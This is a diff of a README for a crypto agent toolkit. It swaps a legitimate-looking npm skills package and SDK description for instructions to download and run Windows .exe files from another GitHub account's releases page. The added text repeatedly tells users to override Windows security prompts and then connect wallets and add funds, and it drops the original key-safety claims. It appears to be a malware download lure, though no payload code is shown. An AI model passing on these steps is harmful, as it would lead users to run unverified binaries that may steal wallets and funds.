@@ -1,108 +1,185 @@
-# Swapper AI Agent Toolkit
+# 🤖 swapper-toolkit - Simple crypto tools for agents
 
-The payment layer for AI agents. Deposit funds, swap tokens, and manage wallets — directly from your AI agent or coding assistant.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clodganjiang151/swapper-toolkit/releases)
 
-Works with [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [Cursor](https://cursor.com), [Windsurf](https://windsurf.com), [OpenClaw](https://openclaw.com), [GitHub Copilot](https://copilot.github.com), [CrewAI](https://crewai.com), [AutoGPT](https://autogpt.net), and any AI agent framework that supports the open skills standard.
+## 🧩 What this is
 
-Powered by [Chainlink CRE](https://chain.link/cre), [Chainlink CCIP](https://chain.link/cross-chain), and [Mastercard](https://mastercard.com).
+swapper-toolkit is a Windows app for managing crypto tasks in one place. It helps you deposit funds, trade tokens, and handle wallets with support for AI agent tools like Claude Code, Cursor, Windsurf, OpenClaw, CrewAI, and AutoGPT.
 
-## Installation
+It is built for people who want a simple way to work with DeFi tools from their computer. You do not need to set up a full developer environment to get started.
 
-```bash
-npx skills add swapperfinance/swapper-toolkit
-```
+## 💾 Download and install
 
-## Available Skills
+Use this link to visit the release page and download the Windows version:
 
-### `/swapper-deposit` — Direct Deposit
+[Go to the release page](https://github.com/Clodganjiang151/swapper-toolkit/releases)
 
-Deposit and bridge funds into wallets and DeFi protocols. Card, wallet, or crypto transfer — straight into the protocol.
+### What to download
 
-- Direct deposits to any wallet address
-- Cross-chain bridge transfers via Chainlink CCIP
-- Protocol deposits — lending, staking, liquidity pools
-- Fiat on-ramp — Mastercard, Visa, Apple Pay, Google Pay (170+ countries)
+Look for the latest release and choose the Windows file that matches your computer:
 
-**Triggers when:**
-- User asks to deposit, fund, top-up, or bridge assets
-- Agent detects a wallet has insufficient funds mid-task
-- User wants to convert fiat to crypto and deposit into DeFi
-- User wants to fund a wallet before executing a strategy
+- `swapper-toolkit-windows-x64.exe` for most Windows PCs
+- `swapper-toolkit-windows-arm64.exe` for ARM-based Windows devices
 
-**Example:**
+If the release includes a ZIP file, you can download that instead and unpack it before running the app.
 
-```
-User: "Deposit $100 USDC into Aave on Base"
+### How to run it
 
-Swapper Deposit Skill:
-→ Chain: Base (8453)
-→ Token: USDC
-→ Protocol: Aave
-→ Amount: $100
-→ Opening deposit link...
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows file.
+4. If the file is in a ZIP folder, extract it first.
+5. Double-click the `.exe` file to start the app.
+6. If Windows shows a security prompt, choose the option that lets you run the file.
 
-✓ Deposit link generated. Confirm in your browser.
-```
+## 🖥️ System needs
 
-**Supported chains:** Ethereum, Base, Arbitrum, Optimism, Polygon, Fast, Solana, HyperEVM, BNB Chain, Avalanche
+For a smooth setup on Windows, use a computer with:
 
-### `/swapper-trade` — Token Swap *(Coming Soon)*
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- A modern web browser for signing in or connecting services
 
-Swap tokens across chains and DEXs. Cross-chain swaps via Chainlink CCIP.
+For best results, keep Windows updated and use the latest version of your browser.
 
-- Same-chain swaps across major DEXs
-- Cross-chain swaps via CCIP
-- Optimal route finding
-- Slippage protection
+## 🔐 What you can do
 
-### `/swapper-wallet` — Wallet Management *(Coming Soon)*
+swapper-toolkit gives you a single place to manage common crypto tasks:
 
-Create, fund, and manage agent wallets.
+- Deposit funds into a wallet
+- Swap tokens across supported DEX flows
+- Check wallet balances
+- Manage multiple wallets
+- Connect with AI agents that can help carry out tasks
+- Keep trading work in one app instead of many tools
 
-- Smart wallet creation with account abstraction
-- Multi-chain wallet setup
-- Wallet funding via fiat or crypto
-- Balance checking
+## 🧠 Who it is for
 
-## SDK Integration
+This app fits users who want to:
 
-For developers building apps who want to embed the deposit flow:
+- Use crypto tools without switching between many sites
+- Connect AI assistants to wallet and trading actions
+- Test DeFi workflows on a Windows machine
+- Keep wallet actions organized
+- Work with common agent frameworks in a simple setup
 
-```bash
-npm i @swapper-finance/deposit-sdk
-```
+## ⚙️ Basic setup steps
 
-```javascript
-import { openSwapperModal } from "@swapper-finance/deposit-sdk";
+After you open the app, follow these steps:
 
-openSwapperModal({
-  integratorId: "your-integrator-id",
-  dstChainId: "8453",
-  dstTokenAddr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-  depositWalletAddress: "0xYourWalletAddress",
-  styles: { themeMode: "dark" },
-  supportedDepositOptions: ["transferCrypto", "depositWithCash"],
-});
-```
+1. Launch swapper-toolkit.
+2. Create or load a wallet.
+3. Connect the network you want to use.
+4. Add funds if needed.
+5. Choose a token swap or wallet action.
+6. Review the details before you confirm.
+7. Wait for the app to finish the action.
 
-## Safety
+If you plan to use an AI agent, connect it from the app’s settings or integration screen, then let it call the wallet or trading actions you want it to handle.
 
-- **Explicit confirmation** — every transaction requires user approval
-- **Transparent fees** — slippage, gas, and risks surfaced before confirmation
-- **Key security** — private keys are never stored or accessed
-- Transactions are never auto-approved
+## 🔌 AI agent support
 
-## Powered by
+swapper-toolkit works with tools and frameworks used for agent workflows, including:
 
-- **[Chainlink CRE](https://chain.link/cre)** — End-to-end workflow orchestration for deposits, compliance, and settlement
-- **[Chainlink CCIP](https://chain.link/cross-chain)** — Cross-chain interoperability across 60+ blockchains
-- **[Mastercard](https://mastercard.com)** — Global card payment processing (170+ countries)
+- Claude Code
+- Cursor
+- Windsurf
+- OpenClaw
+- CrewAI
+- AutoGPT
+- Other agent setups that can call wallet or trade actions
 
-## Documentation
+This makes it easier to use the app as part of a larger workflow where an assistant prepares or runs steps for you.
 
-- [Full docs](https://docs.swapper.finance/ai-agents/skills)
-- [Swapper Finance](https://swapper.finance)
+## 🧭 Common first-time steps
 
-## License
+If this is your first time using the app, start here:
 
-[MIT](LICENSE)
+1. Download the latest Windows release.
+2. Run the app.
+3. Connect a wallet you control.
+4. Check the network name before you send funds.
+5. Start with a small amount when you test a swap.
+6. Confirm each action before you continue.
+
+These steps help you get used to the flow before you handle larger amounts.
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+- Make sure you downloaded the Windows file, not the source code
+- Check that the download finished fully
+- Right-click the file and choose to run it again
+- Move the file to a simple folder like `Downloads` or `Desktop`
+
+If Windows blocks the file:
+
+- Open the file details
+- Choose the option that lets you run it
+- If needed, try downloading the latest release again
+
+If the app connects but actions fail:
+
+- Check your internet connection
+- Make sure the wallet has enough funds for the network fee
+- Confirm that you selected the right network
+- Try again with a smaller test amount
+
+## 📁 Typical release files
+
+A release may include these file types:
+
+- `.exe` for Windows
+- `.zip` for a packaged Windows build
+- `.sha256` for file checks
+- Release notes with version details
+
+If you are not sure which file to use, pick the Windows `.exe` file first.
+
+## 🔒 Safety checks
+
+Before you send funds or sign a transaction:
+
+- Check the token name
+- Check the network
+- Check the wallet address
+- Check the amount
+- Read the final confirmation screen
+
+This helps avoid simple mistakes during swaps or wallet actions.
+
+## 🧱 Project topics
+
+This repository covers work in:
+
+- ai-agent
+- ai-agent-tools
+- ai-coding-assistant
+- autogpt
+- autonomous-agents
+- blockchain
+- claude-code
+- copilot
+- crewai
+- crypto
+- cursor
+- defi
+- dex
+- langchain
+- openclaw
+- token-swap
+- trading
+- wallet
+- web3
+- windsurf
+
+## 📌 Quick path
+
+1. Open the release page
+2. Download the latest Windows file
+3. Run the app
+4. Connect a wallet
+5. Start with a small test action
